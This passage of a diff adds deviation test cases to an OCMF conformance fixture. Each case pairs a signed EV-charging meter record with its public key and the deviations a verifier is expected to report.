+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\",\"RFID_NONE\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221008DBB7F12EC25F9B47911AB559A53FF87339A5333E289CA2EE3B8B204107687350220648C82E2A2A978D8E791D1D3FA8863122454EA7B74B71AA650D6A9526C1C396B\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationFlagsDuplicateGroup"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/source-unidentifiable",
+   "group": "deviation",
+   "description": "no MS, no GS and no CT/CI: nothing ties the record to a signature component",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210083AED7CDFFBEA8B719309C8041CA5F1FCB7193ED1243A1645FD082811D9FA375022046A07DD9E2735DC738DEC741B03EB6DF6038AEA2ABE9F8B0E434D1E3AE14AC64\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["MeterSerialMissing", "SourceUnidentifiable"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/identification-status-missing",
+   "group": "deviation",
+   "description": "IS absent from a transaction record, although Tab. 4 marks it 1..1 there",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402202F7E568203549A7BAAA92C2E0F188F6F52754908ECA640BF5EDF3835D2DFD9ED02205A800CE33493C8AA93EF921940FF4EABFB93A23E1EAC1FC87469E417E944E2FD\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationStatusMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/mandatory-reading-field-missing",
+   "group": "deviation",
+   "description": "the first reading has no TM, and carry-forward has nothing to carry from",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220258A2428F084D5FF8C13FDB7DA2E0456BDEE91966EF21121D68E25333E2F6B430220087E8E11EA291A65C5B59E5B54AE8940FF62A6665238C4CFBEB6A213020A74CA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["MandatoryReadingFieldMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/format-version-ahead-of-reference",
+   "group": "deviation",
+   "description": "FV = 1.4: lawful, and refused by the reference verifier's version dispatch",
+   "record": "OCMF|{\"FV\":\"1.4\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200D582377CFEB165A84D900CA970DB522D0B23198D9BE081D34282FDA8BF3D1C30220023595CF08FFBF86F0D34259F07FB59D241B78CC23F7B3005DF892B18E732575\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionAheadOfReference"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/format-version-malformed",
+   "group": "deviation",
+   "description": "FV = 1.3.1, which carries the revision digit Tab. 1 says is not transmitted",
+   "record": "OCMF|{\"FV\":\"1.3.1\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200BDC7B00C1CA742FD6968BD6744C53A097D5F52A64CBECF899BAA563C574E73A022019DBC4EF870D5BA25EB986EE9B3147B72C8B0FB3FDB66572DB839F8294EE5FC0\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FormatVersionMalformed"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/identification-data-format",
+   "group": "deviation",
+   "description": "IT = ISO14443 with an ID that is not 4 or 7 bytes of hex [OCMF Tab. 17]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"NOT-A-UID\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402201B1BB1BA4862F580908551A20BEBD2CA6AE8E90969FBD09FE1926704F675BDAD0220136E19B974EEBA53371A9D7CCACA7CE5452CC3B49A2CC5CA4A0DA4C6962E03DC\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["IdentificationDataFormat"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/charge-point-id-format",
+   "group": "deviation",
+   "description": "CT = CBIDC with a CI that has no space separator [OCMF Tab. 18]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"CT\":\"CBIDC\",\"CI\":\"STEVE_01\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100FE42221A78FFB84C75917F999E92CEDBEF66D3E5F2EFE32D22DF0FE63D4526E9022058ACA5D85E10B86A4AEC2E70B81F20E9FF58B6708D425A19BE0358D41FA00A48\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ChargePointIdFormat"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/loss-compensation-incomplete",
+   "group": "deviation",
+   "description": "LC without the LR that Tab. 24 marks mandatory inside the block",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"LC\":{\"LN\":\"cable_A\",\"LU\":\"mOhm\"},\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207B7CFE9FA8DE830429B855EDE6C0EFD5BB5285A9C7BC3D3B2B9CC0D78ECF1D770220580EAD825148781DB9E9581FADF438635F7745D8E88DF95FBE5DD6747F8CFADC\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["LossCompensationIncomplete"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/loss-compensation-name-too-long",
+   "group": "deviation",
+   "description": "LN longer than the 20 characters Tab. 24 allows",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"LC\":{\"LN\":\"ccccccccccccccccccccc\",\"LR\":2,\"LU\":\"mOhm\"},\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220444A16C635FCE6BA1B42A9BE8F35D6ADDF399B865761DC05838529462011DF2802207E56F02E20AAF92B8E5DC120D88132231AC1EC28822AB54BA73FE02E3039525E\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FieldTooLong"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/control-character-in-string",
+   "group": "deviation",
+   "description": "a raw control character inside a JSON string, which RFC 8259 forbids and json.org does not",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\u0001\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200DD0A442E43B776DE9CE0CABABD4E95F9732D49E6A79B4E0F498A96AC525EA6102205CB66DE469DABAE994894D03DC01A5F6DE6678D3765AE0E5461E4E560E46DDAB\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["UndefinedTableValue", "ControlCharacterInString"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/unknown-key",
+   "group": "deviation",
+   "description": "a top-level key outside the reserved extension initials U-Z",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"QQ\":1,\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304502210089BB545986116D18A87EACC77883B3C1197170CBD86041E0A9E7F8AF60B7B33302200BB9DF1E36917DB27719520E84B942CEC776CC4A0AF982C1906D9526024A5D99\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["UnknownKey"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/vendor-extension-top-level",
+   "group": "deviation",
+   "description": "a top-level vendor extension, which the spec does reserve",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"UCPN\":1,\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100FBA7C835BC4B9C335604C2646DF6999B4CC90DE722BC0FA3C3FC1C91FB02A5280220150E51CB442E405B9A02544629BB81AE9AC47D3ABDBB296825FF31C2E8E3BF96\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/extension-inside-reading",
+   "group": "deviation",
+   "description": "a vendor extension inside a reading, where the spec reserves no namespace",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\",\"UC\":{\"UN\":\"No_Comp\",\"UI\":2,\"UR\":0}}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200C1B867BBFBECB964D78953CB5999C97E27124D1B0AA41B5C365A455EC010E16022063ED6EC1532682FCBA1670E284E866400AA441FCB4C5D563A22ABFC4B641DD80\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ExtensionInsideReading"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/field-too-long",
+   "group": "deviation",
+   "description": "TT longer than the 250 characters Tab. 4 allows",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"TT\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207C1BD7E6BB74F1DE8F95B9BC320D7C058F2E8299E1664F15C490ED396CA47EBC022047834E5CE0F9BBDFCE2BD158B7E3CDAAFDF3722274ACBA864BFC057DF4B0F716\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FieldTooLong"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/readings-missing",
+   "group": "deviation",
+   "description": "no RD at all: the record states nothing about any meter, and is still evidence",
+   "record": "OCMF|{\"FV\":\"1.3\",\"PG\":\"T1\",\"MS\":\"1CONF00000001\",\"IS\":true,\"IF\":[],\"IT\":\"NONE\"}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207B56D7DC75B59227F4F24CD83809A96C0A03F402148E2E77B968B66B8D4BDA9C02207A6B0459658196CB8EE15AD6853D65FF5BD950AFD6B580CEE47D835C75979C53\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["ReadingsMissing"], "readings": 0, "billable_readings": 0 }
+  },
+  {
+   "id": "deviation/pagination-missing",
+   "group": "deviation",
+   "description": "no PG: the record has no place in a sequence [OCMF Tab. 2]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402201ACF93C511766732D92033D8B9F1DE6FC060E7ABFDF1FB12A4DBC4D197A69381022025008958CFCF60CCB6BCD5CE2054D2FD43983A188E759501DA0349F78C379197\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["PaginationMissing"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/pagination-malformed",
+   "group": "deviation",
+   "description": "PG that is not a context letter followed by digits [OCMF Tab. 2]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"transaction-1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100EF3058626E4E01BCF69BB6F1E8DA9F28E6236EF5C796DD7E416532E41B64B75B022011DB547690A6384E5431F6BB971211B06CF5D94392F5A0C5DA4572D9F8188FFA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["PaginationMalformed"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/field-type-mismatch",
+   "group": "deviation",
+   "description": "IS as a string where Tab. 4 states a boolean: the field is dropped, the record is not",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":\"true\",\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100DF7FE0FFEEEA17A454C1F4602945844473ABDC0BD74BA92564E4412AE592383602200BC9C392A5C391934FB58DE029730C6973EDC92C674B7962A9441A2DFEA5D9AC\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["FieldTypeMismatch"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/time-malformed",
+   "group": "deviation",
+   "description": "TM that is not a timestamp: the reading loses its clock, not the record its signature",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"yesterday afternoon\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"RT\":\"DC\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100D838DB4322E912083834C542A9C687E5611DCDB92575B68CE0CF3F76F411A3D50220075911F57CB1A5C491ABF8B7947D0A20D1F9882C257D08DA1BB4DB6C0BFC4AEA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": ["MandatoryReadingFieldMissing", "TimeStatusMissing", "TimeMalformed"], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "deviation/time-sub-second-digits",
+   "group": "deviation",
+   "description": "TM with six fractional digits where Tab. 7 states three — truncated, and reported",
